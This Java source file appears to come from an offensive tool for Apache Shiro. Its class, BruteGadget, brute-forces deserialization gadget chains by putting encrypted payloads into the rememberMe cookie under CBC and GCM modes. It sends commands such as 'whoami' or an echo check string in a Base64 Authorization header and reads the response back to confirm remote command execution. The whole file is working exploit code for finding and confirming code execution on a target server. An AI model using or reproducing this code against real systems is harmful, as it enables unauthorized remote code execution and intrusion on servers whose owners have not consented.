package com.y5neko.shiroexp.payloads;

import com.y5neko.shiroexp.config.AllList;
import com.y5neko.shiroexp.misc.Log;
import com.y5neko.shiroexp.misc.Tools;
import com.y5neko.shiroexp.object.ResponseOBJ;
import com.y5neko.shiroexp.object.TargetOBJ;
import com.y5neko.shiroexp.request.HttpRequest;

import okhttp3.FormBody;
import okhttp3.RequestBody;

import java.lang.reflect.Method;
import java.util.*;

public class BruteGadget {

    /**
     * 根据 Content-Type 和请求体创建 RequestBody
     * @param contentType Content-Type
     * @param requestBody 请求体内容
     * @return RequestBody 对象
     */
    private static RequestBody createRequestBody(String contentType, String requestBody) {
        if (requestBody != null && !requestBody.isEmpty()) {
            // 用户提供了请求体，使用指定的 Content-Type
            String mediaType = contentType != null ? contentType : "text/plain";
            return RequestBody.create(okhttp3.MediaType.parse(mediaType), requestBody);
        } else {
            // 没有请求体，使用空的 FormBody（默认 application/x-www-form-urlencoded）
            return new FormBody.Builder().build();
        }
    }

    /**
     * 进度回调接口
     */
    public interface ProgressCallback {
        void onProgress(String message);
        void onSuccess(String gadget, String echo);
        void onFail(String gadget, String echo);
    }
    /**
     * 回显链爆破（基础版，无进度回调）
     * @param url 目标对象
     * @param key 密钥
     * @return 有效的回显链列表（格式：gadget+echo）
     */
    public static List<String> bruteGadget(TargetOBJ url, String key) {
        // 从 AllList 获取配置
        List<String> gadgets = new ArrayList<>(Arrays.asList(AllList.gadgets));
        List<String> echos = new ArrayList<>(Arrays.asList(AllList.echoGadgets));

        // 储存验证成功的gadget
        List<String> success_gadgets = new ArrayList<>();

        // 遍历生成payload并验证
        for (String gadget : gadgets) {
            for (String echo : echos) {
                // 获取加密模式
                String cryptType = url.getCryptType();

                // 判断是否需要尝试两种模式
                boolean tryCBC = "爆破所有".equals(cryptType) || "CBC".equals(cryptType);
                boolean tryGCM = "爆破所有".equals(cryptType) || "GCM".equals(cryptType);

                // 尝试 CBC 模式
                if (tryCBC) {
                    try {
                        Class<?> gadget_clazz = Class.forName("com.y5neko.shiroexp.gadget." + gadget);
                        Method method = gadget_clazz.getDeclaredMethod("genEchoPayload", String.class, String.class, String.class);
                        String payload = (String) method.invoke(null, echo, key, "CBC");

                        // 生成验证命令
                        String checkString = Tools.generateRandomString(20);
                        String command = "echo " + checkString;

                        if (echo.equals("AllEcho")) {
                            command = "whoami";
                        }

                        // 构造请求头
                        Map<String, String> headers = new HashMap<>();
                        headers.put("Cookie", url.getRememberMeFlag() + "=" + payload);
                        headers.put("Authorization", "Basic " + Base64.getEncoder().encodeToString(command.getBytes()));

                        // 创建请求体（根据用户配置）
                        RequestBody httpRequestBody = createRequestBody(url.getContentType(), url.getRequestBody());

                        // 校验响应中是否存在
                        ResponseOBJ responseOBJ = HttpRequest.httpRequest(url, httpRequestBody, headers, url.getRequestType());
                        String result1 = Tools.bytesToString(responseOBJ.getResponse());    // 原始response
                        String result = Tools.extractStrings(Tools.bytesToString(responseOBJ.getResponse()));   //提取result的base64
                        result = Tools.bytesToString(Base64.getDecoder().decode(result));

                        if (echo.equals("AllEcho")) {
                            if (result1.contains("$$$")) {
                                System.out.println(Log.buffer_logging("SUCC", "发现回显链: " + gadget + " -> " + echo + " (CBC)"));
                                success_gadgets.add(gadget + "+" + echo);
                            }
                        } else {
                            if (result.contains(checkString)) {
                                System.out.println(Log.buffer_logging("SUCC", "发现回显链: " + gadget + " -> " + echo + " (CBC)"));
                                success_gadgets.add(gadget + "+" + echo);
                            }
                        }
                    } catch (IndexOutOfBoundsException e) {
                        // CBC 模式失败，继续尝试
                    } catch (Exception e){
                        // CBC 模式异常，继续尝试
                    }
                }

                // 尝试 GCM 模式
                if (tryGCM) {
                    try {
                        Class<?> gadget_clazz = Class.forName("com.y5neko.shiroexp.gadget." + gadget);
                        Method method = gadget_clazz.getDeclaredMethod("genEchoPayload", String.class, String.class, String.class);
                        String payload = (String) method.invoke(null, echo, key, "GCM");

                        // 生成验证命令
                        String checkString = Tools.generateRandomString(20);
                        String command = "echo " + checkString;

                        if (echo.equals("AllEcho")) {
                            command = "whoami";
                        }

                        // 构造请求头
                        Map<String, String> headers = new HashMap<>();
                        headers.put("Cookie", url.getRememberMeFlag() + "=" + payload);
                        headers.put("Authorization", "Basic " + Base64.getEncoder().encodeToString(command.getBytes()));

                        // 创建请求体（根据用户配置）
                        RequestBody httpRequestBody = createRequestBody(url.getContentType(), url.getRequestBody());

                        // 校验响应中是否存在
                        ResponseOBJ responseOBJ = HttpRequest.httpRequest(url, httpRequestBody, headers, url.getRequestType());
                        String result1 = Tools.bytesToString(responseOBJ.getResponse());    // 原始response
                        String result = Tools.extractStrings(Tools.bytesToString(responseOBJ.getResponse()));   //提取result的base64
                        result = Tools.bytesToString(Base64.getDecoder().decode(result));

                        if (echo.equals("AllEcho")) {
                            if (result1.contains("$$$")) {
                                System.out.println(Log.buffer_logging("SUCC", "发现回显链: " + gadget + " -> " + echo + " (GCM)"));
                                // 避免重复添加（CBC 已成功的情况下）
                                String comboKey = gadget + "+" + echo;
                                if (!success_gadgets.contains(comboKey)) {
                                    success_gadgets.add(comboKey);
                                }
                            }
                        } else {
                            if (result.contains(checkString)) {
                                System.out.println(Log.buffer_logging("SUCC", "发现回显链: " + gadget + " -> " + echo + " (GCM)"));
                                // 避免重复添加（CBC 已成功的情况下）
                                String comboKey = gadget + "+" + echo;
                                if (!success_gadgets.contains(comboKey)) {
                                    success_gadgets.add(comboKey);
                                }
                            }
                        }
                    } catch (IndexOutOfBoundsException e) {
                        // GCM 模式失败，忽略
                    } catch (Exception e){
                        // GCM 模式异常，忽略
                    }
                }
            }
        }

        // 输出汇总结果
        System.out.println("========================================");
        if (success_gadgets.isEmpty()) {
            System.out.println(Log.buffer_logging("FAIL", "未发现有效回显链"));
        } else {
            System.out.println(Log.buffer_logging("SUCC", "共发现" + success_gadgets.size() + "条有效回显链"));
            System.out.println("----------");
            for (String success_gadget : success_gadgets) {
                String[] parts = success_gadget.split("\\+");
                System.out.println(parts[0] + " + " + parts[1]);
            }
            System.out.println("----------");
        }
        System.out.println("========================================");

        return success_gadgets;
    }

    /**
     * 带进度回调的回显链爆破
     * @param url 目标对象
     * @param callback 进度回调接口
     * @return 有效的回显链列表
     */
    public static List<String> bruteGadget(TargetOBJ url, String key, ProgressCallback callback) {
        // 从 AllList 获取配置
        List<String> gadgets = new ArrayList<>(Arrays.asList(AllList.gadgets));
        List<String> echos = new ArrayList<>(Arrays.asList(AllList.echoGadgets));

        // 储存验证成功的gadget
        List<String> success_gadgets = new ArrayList<>();

        int total = gadgets.size() * echos.size();
        int current = 0;

        // 遍历生成payload并验证
        for (String gadget : gadgets) {
            for (String echo : echos) {
                // 获取加密模式
                String cryptType = url.getCryptType();

                // 判断是否需要尝试两种模式
                boolean tryCBC = "爆破所有".equals(cryptType) || "CBC".equals(cryptType);
                boolean tryGCM = "爆破所有".equals(cryptType) || "GCM".equals(cryptType);

                boolean cbcSuccess = false;
                boolean gcmSuccess = false;

                // 尝试 CBC 模式（独立测试，不影响 GCM）
                if (tryCBC) {
                    try {
                        Class<?> gadget_clazz = Class.forName("com.y5neko.shiroexp.gadget." + gadget);
                        Method method = gadget_clazz.getDeclaredMethod("genEchoPayload", String.class, String.class, String.class);
                        String payload = (String) method.invoke(null, echo, key, "CBC");

                        // 生成验证命令
                        String checkString = Tools.generateRandomString(20);
                        String command = "echo " + checkString;

                        if (echo.equals("AllEcho")) {
                            command = "whoami";
                        }

                        // 构造请求头
                        Map<String, String> headers = new HashMap<>();
                        headers.put("Cookie", url.getRememberMeFlag() + "=" + payload);
                        headers.put("Authorization", "Basic " + Base64.getEncoder().encodeToString(command.getBytes()));

                        // 创建请求体（根据用户配置）
                        RequestBody httpRequestBody = createRequestBody(url.getContentType(), url.getRequestBody());

                        // 校验响应中是否存在
                        ResponseOBJ responseOBJ = HttpRequest.httpRequest(url, httpRequestBody, headers, url.getRequestType());
                        String result1 = Tools.bytesToString(responseOBJ.getResponse());
                        String result = Tools.extractStrings(Tools.bytesToString(responseOBJ.getResponse()));
                        result = Tools.bytesToString(Base64.getDecoder().decode(result));

                        if (echo.equals("AllEcho")) {
                            if (result1.contains("$$$")) {
                                cbcSuccess = true;
                                System.out.println(Log.buffer_logging("SUCC", "发现回显链: " + gadget + " -> " + echo + " (CBC)"));
                                if (callback != null) {
                                    callback.onSuccess(gadget, echo);
                                }
                                success_gadgets.add(gadget + "+" + echo);
                            }
                        } else {
                            if (result.contains(checkString)) {
                                cbcSuccess = true;
                                System.out.println(Log.buffer_logging("SUCC", "发现回显链: " + gadget + " -> " + echo + " (CBC)"));
                                if (callback != null) {
                                    callback.onSuccess(gadget, echo);
                                }
                                success_gadgets.add(gadget + "+" + echo);
                            }
                        }
                    } catch (IndexOutOfBoundsException e) {
                        // CBC 模式失败，继续尝试
                    } catch (Exception e) {
                        // CBC 模式异常，继续尝试
                    }
                }

                // 尝试 GCM 模式（独立测试，与 CBC 无关）
                if (tryGCM) {
                    try {
                        Class<?> gadget_clazz = Class.forName("com.y5neko.shiroexp.gadget." + gadget);
                        Method method = gadget_clazz.getDeclaredMethod("genEchoPayload", String.class, String.class, String.class);
                        String payload = (String) method.invoke(null, echo, key, "GCM");

                        // 生成验证命令
                        String checkString = Tools.generateRandomString(20);
                        String command = "echo " + checkString;

                        if (echo.equals("AllEcho")) {
                            command = "whoami";
                        }

                        // 构造请求头
                        Map<String, String> headers = new HashMap<>();
                        headers.put("Cookie", url.getRememberMeFlag() + "=" + payload);
                        headers.put("Authorization", "Basic " + Base64.getEncoder().encodeToString(command.getBytes()));

                        // 创建请求体（根据用户配置）
                        RequestBody httpRequestBody = createRequestBody(url.getContentType(), url.getRequestBody());

                        // 校验响应中是否存在
                        ResponseOBJ responseOBJ = HttpRequest.httpRequest(url, httpRequestBody, headers, url.getRequestType());
                        String result1 = Tools.bytesToString(responseOBJ.getResponse());
                        String result = Tools.extractStrings(Tools.bytesToString(responseOBJ.getResponse()));
                        result = Tools.bytesToString(Base64.getDecoder().decode(result));

                        if (echo.equals("AllEcho")) {
                            if (result1.contains("$$$")) {
                                gcmSuccess = true;
                                System.out.println(Log.buffer_logging("SUCC", "发现回显链: " + gadget + " -> " + echo + " (GCM)"));
                                if (callback != null) {
                                    callback.onSuccess(gadget, echo);
                                }
                                // 避免重复添加
                                String comboKey = gadget + "+" + echo;
                                if (!success_gadgets.contains(comboKey)) {
                                    success_gadgets.add(comboKey);
                                }
                            }
                        } else {
                            if (result.contains(checkString)) {
                                gcmSuccess = true;
                                System.out.println(Log.buffer_logging("SUCC", "发现回显链: " + gadget + " -> " + echo + " (GCM)"));
                                if (callback != null) {
                                    callback.onSuccess(gadget, echo);
                                }
                                // 避免重复添加
                                String comboKey = gadget + "+" + echo;
                                if (!success_gadgets.contains(comboKey)) {
                                    success_gadgets.add(comboKey);
                                }
                            }
                        }
                    } catch (IndexOutOfBoundsException e) {
                        // GCM 模式失败
                    } catch (Exception e) {
                        // GCM 模式异常
                    }
                }

                // 如果两种模式都失败，回调失败
                if (!cbcSuccess && !gcmSuccess) {
                    if (callback != null) {
                        callback.onFail(gadget, echo);
                    }
                }
            }
        }

        // 输出汇总结果
        System.out.println("========================================");
        if (success_gadgets.isEmpty()) {
            String failMsg = "[FAIL]未发现有效回显链";
            System.out.println(Log.buffer_logging("FAIL", "未发现有效回显链"));
            if (callback != null) {
                callback.onProgress(failMsg);
            }
        } else {
            String summaryMsg = "[SUCC]共发现" + success_gadgets.size() + "条有效回显链";
            System.out.println(Log.buffer_logging("SUCC", "共发现" + success_gadgets.size() + "条有效回显链"));
            System.out.println("----------");
            for (String success_gadget : success_gadgets) {
                String[] parts = success_gadget.split("\\+");
                System.out.println(parts[0] + " + " + parts[1]);
            }
            System.out.println("----------");
            if (callback != null) {
                callback.onProgress(summaryMsg);
            }
        }
        System.out.println("========================================");

        return success_gadgets;
    }

    /**
     * 自定义gadget和echo列表的爆破
     * @param url 目标对象
     * @param key 密钥
     * @param gadgets 要测试的gadget列表
     * @param echos 要测试的echo列表
     * @param callback 进度回调接口
     * @return 有效的回显链列表
     */
    public static List<String> bruteGadgetCustom(TargetOBJ url, String key, List<String> gadgets, List<String> echos, ProgressCallback callback) {
        // 储存验证成功的gadget
        List<String> success_gadgets = new ArrayList<>();

        int total = gadgets.size() * echos.size();
        int current = 0;

        // 遍历生成payload并验证
        for (String gadget : gadgets) {
            for (String echo : echos) {
                current++;
                String progressMsg = String.format("[INFO]正在测试 [%d/%d]: %s + %s", current, total, gadget, echo);
                if (callback != null) {
                    callback.onProgress(progressMsg);
                }
                System.out.println(Log.buffer_logging("INFO", "正在测试: " + gadget + " -> " + echo));

                // 获取加密模式
                String cryptType = url.getCryptType();

                // 判断是否需要尝试两种模式
                boolean tryCBC = "爆破所有".equals(cryptType) || "CBC".equals(cryptType);
                boolean tryGCM = "爆破所有".equals(cryptType) || "GCM".equals(cryptType);

                boolean cbcSuccess = false;
                boolean gcmSuccess = false;

                // 尝试 CBC 模式（独立测试，不影响 GCM）
                if (tryCBC) {
                    try {
                        Class<?> gadget_clazz = Class.forName("com.y5neko.shiroexp.gadget." + gadget);
                        Method method = gadget_clazz.getDeclaredMethod("genEchoPayload", String.class, String.class, String.class);
                        String payload = (String) method.invoke(null, echo, key, "CBC");

                        // 生成验证命令
                        String checkString = Tools.generateRandomString(20);
                        String command = "echo " + checkString;

                        if (echo.equals("AllEcho")) {
                            command = "whoami";
                        }

                        // 构造请求头
                        Map<String, String> headers = new HashMap<>();
                        headers.put("Cookie", url.getRememberMeFlag() + "=" + payload);
                        headers.put("Authorization", "Basic " + Base64.getEncoder().encodeToString(command.getBytes()));

                        // 创建请求体（根据用户配置）
                        RequestBody httpRequestBody = createRequestBody(url.getContentType(), url.getRequestBody());

                        // 校验响应中是否存在
                        ResponseOBJ responseOBJ = HttpRequest.httpRequest(url, httpRequestBody, headers, url.getRequestType());
                        String result1 = Tools.bytesToString(responseOBJ.getResponse());
                        String result = Tools.extractStrings(Tools.bytesToString(responseOBJ.getResponse()));
                        result = Tools.bytesToString(Base64.getDecoder().decode(result));

                        if (echo.equals("AllEcho")) {
                            if (result1.contains("$$$")) {
                                cbcSuccess = true;
                                System.out.println(Log.buffer_logging("SUCC", "发现回显链: " + gadget + " -> " + echo + " (CBC)"));
                                if (callback != null) {
                                    callback.onSuccess(gadget, echo);
                                }
                                success_gadgets.add(gadget + "+" + echo);
                            }
                        } else {
                            if (result.contains(checkString)) {
                                cbcSuccess = true;
                                System.out.println(Log.buffer_logging("SUCC", "发现回显链: " + gadget + " -> " + echo + " (CBC)"));
                                if (callback != null) {
                                    callback.onSuccess(gadget, echo);
                                }
                                success_gadgets.add(gadget + "+" + echo);
                            }
                        }
                    } catch (IndexOutOfBoundsException e) {
                        // CBC 模式失败，继续尝试
                    } catch (Exception e) {
                        // CBC 模式异常，继续尝试
                    }
                }

                // 尝试 GCM 模式（独立测试，与 CBC 无关）
                if (tryGCM) {
                    try {
                        Class<?> gadget_clazz = Class.forName("com.y5neko.shiroexp.gadget." + gadget);
                        Method method = gadget_clazz.getDeclaredMethod("genEchoPayload", String.class, String.class, String.class);
                        String payload = (String) method.invoke(null, echo, key, "GCM");

                        // 生成验证命令
                        String checkString = Tools.generateRandomString(20);
                        String command = "echo " + checkString;

                        if (echo.equals("AllEcho")) {
                            command = "whoami";
                        }

                        // 构造请求头
                        Map<String, String> headers = new HashMap<>();
                        headers.put("Cookie", url.getRememberMeFlag() + "=" + payload);
                        headers.put("Authorization", "Basic " + Base64.getEncoder().encodeToString(command.getBytes()));

                        // 创建请求体（根据用户配置）
                        RequestBody httpRequestBody = createRequestBody(url.getContentType(), url.getRequestBody());

                        // 校验响应中是否存在
                        ResponseOBJ responseOBJ = HttpRequest.httpRequest(url, httpRequestBody, headers, url.getRequestType());
                        String result1 = Tools.bytesToString(responseOBJ.getResponse());
                        String result = Tools.extractStrings(Tools.bytesToString(responseOBJ.getResponse()));
                        result = Tools.bytesToString(Base64.getDecoder().decode(result));

                        if (echo.equals("AllEcho")) {
                            if (result1.contains("$$$")) {
                                gcmSuccess = true;
                                System.out.println(Log.buffer_logging("SUCC", "发现回显链: " + gadget + " -> " + echo + " (GCM)"));
                                if (callback != null) {
                                    callback.onSuccess(gadget, echo);
                                }
                                // 避免重复添加
                                String comboKey = gadget + "+" + echo;
                                if (!success_gadgets.contains(comboKey)) {
                                    success_gadgets.add(comboKey);
                                }
                            }
                        } else {
                            if (result.contains(checkString)) {
                                gcmSuccess = true;
                                System.out.println(Log.buffer_logging("SUCC", "发现回显链: " + gadget + " -> " + echo + " (GCM)"));
                                if (callback != null) {
                                    callback.onSuccess(gadget, echo);
                                }
                                // 避免重复添加
                                String comboKey = gadget + "+" + echo;
                                if (!success_gadgets.contains(comboKey)) {
                                    success_gadgets.add(comboKey);
                                }
                            }
                        }
                    } catch (IndexOutOfBoundsException e) {
                        // GCM 模式失败
                    } catch (Exception e) {
                        // GCM 模式异常
                    }
                }

                // 如果两种模式都失败，回调失败
                if (!cbcSuccess && !gcmSuccess) {
                    if (callback != null) {
                        callback.onFail(gadget, echo);
                    }
                }
            }
        }

        // 输出汇总结果
        System.out.println("========================================");
        if (success_gadgets.isEmpty()) {
            String failMsg = "[FAIL]未发现有效回显链";
            System.out.println(Log.buffer_logging("FAIL", "未发现有效回显链"));
            if (callback != null) {
                callback.onProgress(failMsg);
            }
        } else {
            String summaryMsg = "[SUCC]共发现" + success_gadgets.size() + "条有效回显链";
            System.out.println(Log.buffer_logging("SUCC", "共发现" + success_gadgets.size() + "条有效回显链"));
            System.out.println("----------");
            for (String success_gadget : success_gadgets) {
                String[] parts = success_gadget.split("\\+");
                System.out.println(parts[0] + " + " + parts[1]);
            }
            System.out.println("----------");
            if (callback != null) {
                callback.onProgress(summaryMsg);
            }
        }
        System.out.println("========================================");

        return success_gadgets;
    }
}
